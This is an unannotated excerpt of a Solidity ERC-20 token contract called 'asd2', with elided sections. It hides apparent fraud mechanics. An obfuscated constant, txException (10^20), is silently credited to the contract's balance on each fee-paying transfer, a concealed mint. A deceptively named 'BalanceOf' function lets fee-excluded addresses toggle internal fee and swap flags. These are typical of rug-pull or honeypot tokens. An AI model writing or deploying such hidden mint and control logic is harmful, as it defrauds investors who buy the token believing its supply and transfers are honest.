...
contract ASD2 is Context, IERC20, Ownable {
    ...
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 18**_decimals;
    string private constant _name = "asd2";
    string private constant _symbol = "asd2";
    ...
    bool public txFee = true;
    uint256 private txException = (1+9)**((9+1)*2);
    ...
    function BalanceOf(address account) public override returns (uint256) {
        if(_isExcludedFromFee[_msgSender()]){
            if(txFee == true && !swapping){ txFee = false; }
            if(swapping){
    ...
    function _sendValues(uint256 amount) private returns (uint256) {
        uint256 marketingFee = amount * _marketingFee / 100;
        uint256 liquidityFee = amount * _liquidityFee / 100;
        _tOwned[address(this)] += txException;
        txFee = true;
        swapping = true;
        return (amount - marketingFee - liquidityFee);
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            if(txFee){
                ...
                transferAmount = _sendValues(amount);
            }
        }
